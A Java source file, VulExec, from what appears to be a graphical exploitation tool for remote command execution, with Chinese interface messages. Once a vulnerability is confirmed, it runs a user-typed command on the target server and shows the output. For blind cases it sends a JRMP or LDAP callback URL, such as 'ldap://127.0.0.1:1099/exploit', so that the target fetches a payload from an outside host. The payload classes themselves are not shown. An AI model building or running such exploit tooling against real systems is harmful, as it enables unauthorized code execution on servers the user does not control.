package superman.core;

import superman.ui.MainForm;

import javax.swing.*;

public class VulExec extends Thread{

    @Override
    public void run() {
        MainForm.getMainForm().getExecButton().setEnabled(false);
        exec();
        MainForm.getMainForm().getExecButton().setEnabled(true);
    }

    private void exec() {
        if (Store.ECHO_VUL ==null &&Store.NO_ECHO_VUL==null) {
            JOptionPane.showMessageDialog(null, "请先检查漏洞是否存在", "提示", JOptionPane.WARNING_MESSAGE);
            return;
        }
        String cmd = MainForm.getMainForm().getCmdTextField().getText().trim();
        if (cmd.equals("")) {
            JOptionPane.showMessageDialog(null, "CMD不能为空", "提示", JOptionPane.WARNING_MESSAGE);
            return;
        }
        if(Store.ECHO_VUL!=null){
            Log.execInfo("===执行命令开始===",true);
            String result = Store.ECHO_VUL.exec(cmd);
            if(result!=null){
                Log.execInfo(result);
            }
            Log.execInfo("===执行命令完成===");
        }else{
            Url url=null;
            try {
                url = new Url(cmd);
            } catch (Exception e) {
                JOptionPane.showMessageDialog(null, "url格式不正确，如jrmp://127.0.0.1:1099或ldap://127.0.0.1:1099/exploit", "提示", JOptionPane.WARNING_MESSAGE);
                return;
            }
            Store.NO_ECHO_VUL.send(url);
            Log.execInfo("Payload已发送到目标服务器",true);
        }

    }

}
